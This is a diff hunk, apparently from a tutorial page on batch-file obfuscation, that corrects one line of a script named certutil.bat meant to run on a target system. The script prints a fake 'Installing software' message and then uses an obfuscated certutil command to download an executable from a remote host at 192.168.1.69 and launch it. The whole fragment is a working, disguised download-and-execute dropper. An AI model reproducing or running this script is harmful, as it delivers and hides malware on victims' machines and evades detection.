@@ -204,7 +204,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 - File **certutil.bat** to be executed in target system
 
       @echo off
-      sEt e=!h&& sEt c=db&& a=0x
+      sEt e=!h&& sEt c=db&& sEt a=0x
       echo [+] Please Wait, Installing software ..
       ;%d^b%M%A%d"."eX%!h% /%db% @%db%e"r"Tu%C%tIl.%!h%^xe -uR%A%l%db%%0x%ch%!h% -sP%F%l^It -f ht%D%tp://192.168.1.69/%0x%g%!h%Nt.E^x%!h% %0x%Ge%T%N^t.%!h%^xE && s^t%0x%r%K%T %0x%"g"%!h%Nt.e%H%x%!h%
       exit
